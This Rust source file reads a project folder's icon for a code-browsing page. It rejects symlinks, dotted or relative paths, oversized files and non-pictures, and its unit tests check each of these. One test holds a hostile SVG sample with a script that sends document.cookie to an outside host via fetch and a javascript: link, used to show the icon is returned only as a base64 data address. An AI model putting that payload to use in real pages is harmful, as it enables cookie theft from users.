//! A project's own icon (item 100b, part 1): the picture a project's folder keeps in one of a few known places, for the Code
//! page's project rows to show instead of the folder glyph. Read only, and only by the shell:
//!
//! - Only the places in [`PLACES`], in that order, under the folder the page names: no path ever comes from the page but the
//!   folder's own, which must be absolute and hold no `.` or `..` part.
//! - Never through a link: every folder between the project's folder and the file, and the file itself, is read with
//!   `symlink_metadata` and must be a real folder or a real file; the file is opened with `O_NOFOLLOW`, and its real path must
//!   still be inside the project's real folder.
//! - At most [`MAX`] bytes. A file larger than that is not read at all.
//! - Only a picture: an SVG must be UTF-8 text with an `<svg` element in it, a PNG must start with PNG's signature and an ICO
//!   with ICO's. The answer is a `data:` address of that type, which the page draws only as an `<img>` (code/ProjectIcon.tsx),
//!   never inline: an SVG drawn as an image runs none of its scripts and loads none of its links.
//! - Kept by path, size and modified time: a file whose size and time have not changed is not read again.
use std::collections::HashMap;
use std::io::Read;
use std::path::{Component, Path, PathBuf};
use std::sync::Mutex;
use std::time::SystemTime;

/// Where a project keeps its icon, the first found wins: the places the common web frameworks and repositories use.
pub const PLACES: [&str; 9] = ["public/favicon.svg", "favicon.svg", "public/favicon.ico", "favicon.ico", "app/icon.png", "app/favicon.ico", "src/app/icon.png", "assets/icon.png", ".github/logo.png"];
/// The largest icon read.
pub const MAX: u64 = 64 * 1024;
/// The most icons kept.
const KEPT_MAX: usize = 256;

const PNG: &[u8] = b"\x89PNG\r\n\x1a\n";
const ICO: &[u8] = &[0, 0, 1, 0];

/// The picture's type for `place`'s bytes, or None when they are not the picture its name says.
fn kind(place: &str, bytes: &[u8]) -> Option<&'static str> {
    if place.ends_with(".svg") {
        let text = std::str::from_utf8(bytes).ok()?;
        return text.to_ascii_lowercase().contains("<svg").then_some("image/svg+xml");
    }
    if place.ends_with(".png") {
        return bytes.starts_with(PNG).then_some("image/png");
    }
    if place.ends_with(".ico") {
        return (bytes.len() > 6 && bytes.starts_with(ICO)).then_some("image/x-icon");
    }
    None
}

/// The folder as the page named it, when it may be read: absolute, with no `.` or `..` part.
fn folder_ok(folder: &str) -> Option<PathBuf> {
    let p = PathBuf::from(folder);
    // read from the words as given: `Path::components` drops a `.` in the middle of a path
    let dotted = folder.split(['/', '\\']).any(|part| part == "." || part == "..");
    if folder.is_empty() || !p.is_absolute() || dotted || p.components().any(|c| matches!(c, Component::CurDir | Component::ParentDir)) {
        return None;
    }
    Some(p)
}

/// `place` under `root` (the project's real folder) when every folder on the way and the file itself are real ones, never a
/// link, and the file is a regular file of at most [`MAX`] bytes: its path, size and modified time.
fn found(root: &Path, place: &str) -> Option<(PathBuf, u64, SystemTime)> {
    let mut at = root.to_path_buf();
    let parts: Vec<&str> = place.split('/').collect();
    for (i, part) in parts.iter().enumerate() {
        at.push(part);
        let m = std::fs::symlink_metadata(&at).ok()?;
        if m.file_type().is_symlink() {
            return None;
        }
        let last = i + 1 == parts.len();
        if (last && !m.is_file()) || (!last && !m.is_dir()) {
            return None;
        }
        if last {
            if m.len() == 0 || m.len() > MAX {
                return None;
            }
            return Some((at, m.len(), m.modified().ok()?));
        }
    }
    None
}

/// The file at `path`, opened without following a link, when it is still a regular file of at most [`MAX`] bytes.
fn read_file(path: &Path) -> Option<Vec<u8>> {
    let mut o = std::fs::OpenOptions::new();
    o.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        o.custom_flags(libc::O_NOFOLLOW);
    }
    let f = o.open(path).ok()?;
    let m = f.metadata().ok()?;
    if !m.is_file() || m.len() > MAX {
        return None;
    }
    let mut b = Vec::new();
    f.take(MAX + 1).read_to_end(&mut b).ok()?;
    (b.len() as u64 <= MAX).then_some(b)
}

/// The icons read this run: by path, the size and modified time they were read at, and their address.
#[derive(Default)]
pub struct Icons {
    kept: Mutex<HashMap<PathBuf, (u64, SystemTime, String)>>,
}

impl Icons {
    /// The icon of the project at `folder`, as a `data:` address, or None when it keeps none (see the top of this file).
    pub fn icon(&self, folder: &str) -> Option<String> {
        let named = folder_ok(folder)?;
        let root = named.canonicalize().ok()?;
        if !root.is_dir() {
            return None;
        }
        for place in PLACES {
            let Some((path, len, modified)) = found(&root, place) else { continue };
            if let Some((l, t, url)) = self.kept.lock().ok().and_then(|m| m.get(&path).cloned()) {
                if l == len && t == modified {
                    return Some(url);
                }
            }
            let Some(bytes) = read_file(&path) else { continue };
            // the file read must still be the one inside the project's folder
            if !path.canonicalize().is_ok_and(|real| real.starts_with(&root)) {
                continue;
            }
            let Some(mime) = kind(place, &bytes) else { continue };
            let url = format!("data:{mime};base64,{}", crate::session_files::base64(&bytes));
            if let Ok(mut m) = self.kept.lock() {
                if m.len() >= KEPT_MAX {
                    m.clear();
                }
                m.insert(path, (len, modified, url.clone()));
            }
            return Some(url);
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn temp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("manut-icon-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d.canonicalize().unwrap()
    }

    fn put(root: &Path, place: &str, bytes: &[u8]) {
        let p = root.join(place);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, bytes).unwrap();
    }

    fn png() -> Vec<u8> {
        let mut b = PNG.to_vec();
        b.extend_from_slice(b"\0\0\0\rIHDR rest of a picture");
        b
    }

    const SVG: &str = r#"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><circle cx="8" cy="8" r="7"/></svg>"#;

    fn decoded(url: &str) -> Vec<u8> {
        let b64 = url.split_once(";base64,").unwrap().1;
        let t = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = Vec::new();
        let mut buf = 0u32;
        let mut bits = 0;
        for c in b64.bytes().filter(|c| *c != b'=') {
            buf = (buf << 6) | t.iter().position(|x| *x == c).unwrap() as u32;
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push((buf >> bits) as u8);
            }
        }
        out
    }

    #[test]
    fn each_place_is_read_in_its_order() {
        let ico: Vec<u8> = [&ICO[..], b"\x01\x00\x10\x10 icon bytes"].concat();
        for place in PLACES {
            let root = temp(&format!("place-{}", place.replace('/', "_")));
            let bytes = if place.ends_with(".svg") { SVG.as_bytes().to_vec() } else if place.ends_with(".png") { png() } else { ico.clone() };
            put(&root, place, &bytes);
            let url = Icons::default().icon(root.to_str().unwrap()).unwrap_or_else(|| panic!("{place}"));
            let mime = if place.ends_with(".svg") { "image/svg+xml" } else if place.ends_with(".png") { "image/png" } else { "image/x-icon" };
            assert!(url.starts_with(&format!("data:{mime};base64,")), "{place}: {url}");
            assert_eq!(decoded(&url), bytes, "{place}");
            let _ = fs::remove_dir_all(root);
        }
        // the first place found wins
        let root = temp("order");
        put(&root, "assets/icon.png", &png());
        put(&root, "favicon.svg", SVG.as_bytes());
        assert!(Icons::default().icon(root.to_str().unwrap()).unwrap().starts_with("data:image/svg+xml;base64,"));
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn a_folder_with_none_or_with_something_that_is_not_a_picture_has_none() {
        let root = temp("none");
        assert_eq!(Icons::default().icon(root.to_str().unwrap()), None);
        // a text file named like an icon, a PNG that is not one, an empty file
        put(&root, "favicon.svg", b"console.log('not a picture')");
        put(&root, "app/icon.png", b"GIF89a");
        put(&root, "favicon.ico", b"");
        assert_eq!(Icons::default().icon(root.to_str().unwrap()), None);
        // a place that is a folder
        fs::create_dir_all(root.join("public/favicon.svg")).unwrap();
        assert_eq!(Icons::default().icon(root.to_str().unwrap()), None);
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn a_file_over_the_cap_is_not_read() {
        let root = temp("cap");
        let mut big = png();
        big.resize(MAX as usize + 1, 0);
        put(&root, "assets/icon.png", &big);
        assert_eq!(Icons::default().icon(root.to_str().unwrap()), None);
        // exactly the cap is read
        big.truncate(MAX as usize);
        put(&root, "assets/icon.png", &big);
        assert!(Icons::default().icon(root.to_str().unwrap()).is_some());
        let _ = fs::remove_dir_all(root);
    }

    #[cfg(unix)]
    #[test]
    fn a_link_is_never_followed_to_a_file_or_through_a_folder() {
        use std::os::unix::fs::symlink;
        let root = temp("link");
        let outside = temp("link-outside");
        put(&outside, "favicon.svg", SVG.as_bytes());
        put(&outside, "public/favicon.svg", SVG.as_bytes());
        // the file is a link to a picture outside the project
        symlink(outside.join("favicon.svg"), root.join("favicon.svg")).unwrap();
        // a folder on the way is a link to a folder outside it
        symlink(outside.join("public"), root.join("public")).unwrap();
        // and a link to a picture inside the project is a link too
        put(&root, "real.png", &png());
        fs::create_dir_all(root.join("assets")).unwrap();
        symlink(root.join("real.png"), root.join("assets/icon.png")).unwrap();
        assert_eq!(Icons::default().icon(root.to_str().unwrap()), None);
        let _ = fs::remove_dir_all(root);
        let _ = fs::remove_dir_all(outside);
    }

    #[test]
    fn a_folder_named_with_a_relative_or_dotted_path_is_refused() {
        let root = temp("outside");
        let inner = root.join("site");
        put(&inner, "favicon.svg", SVG.as_bytes());
        put(&root, "favicon.svg", SVG.as_bytes());
        let icons = Icons::default();
        assert!(icons.icon(inner.to_str().unwrap()).is_some());
        // a path that climbs out of the folder it names, a relative one, one with a `.` part, and none
        for bad in [format!("{}/..", inner.display()), format!("{}/../site", inner.display()), "site".to_string(), format!("{}/./site", root.display()), String::new()] {
            assert_eq!(icons.icon(&bad), None, "{bad}");
        }
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn an_svg_with_a_script_and_a_link_is_given_as_a_picture_address_only() {
        let root = temp("script");
        let hostile = r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script>fetch('https://example.com/?'+document.cookie)</script><a xlink:href="javascript:alert(1)"><rect width="16" height="16"/></a><image href="https://example.com/x.png"/></svg>"#;
        put(&root, "favicon.svg", hostile.as_bytes());
        let url = Icons::default().icon(root.to_str().unwrap()).unwrap();
        // the page gets an address of an image's type, base64 from its first byte: nothing of the file is text the page could
        // put into its own markup
        assert!(url.starts_with("data:image/svg+xml;base64,"), "{url}");
        let b64 = url.trim_start_matches("data:image/svg+xml;base64,");
        assert!(b64.bytes().all(|c| c.is_ascii_alphanumeric() || matches!(c, b'+' | b'/' | b'=')), "{b64}");
        assert!(!url.contains("<script") && !url.contains("javascript:"));
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn an_icon_is_kept_by_size_and_time_and_read_again_when_either_changes() {
        let root = temp("kept");
        put(&root, "favicon.svg", SVG.as_bytes());
        let icons = Icons::default();
        let first = icons.icon(root.to_str().unwrap()).unwrap();
        let path = root.join("favicon.svg");
        assert_eq!(icons.kept.lock().unwrap().get(&path).map(|e| e.0), Some(SVG.len() as u64));
        // the kept answer is what is given while the file's size and time are the same: a changed kept address proves it
        icons.kept.lock().unwrap().get_mut(&path).unwrap().2 = "data:image/svg+xml;base64,S0VQVA==".into();
        assert_eq!(icons.icon(root.to_str().unwrap()).unwrap(), "data:image/svg+xml;base64,S0VQVA==");
        // a new picture of another size is read again
        let other = SVG.replace("r=\"7\"", "r=\"6.5\"");
        fs::write(&path, &other).unwrap();
        let again = icons.icon(root.to_str().unwrap()).unwrap();
        assert_ne!(again, first);
        assert_eq!(decoded(&again), other.as_bytes());
        let _ = fs::remove_dir_all(root);
    }
}
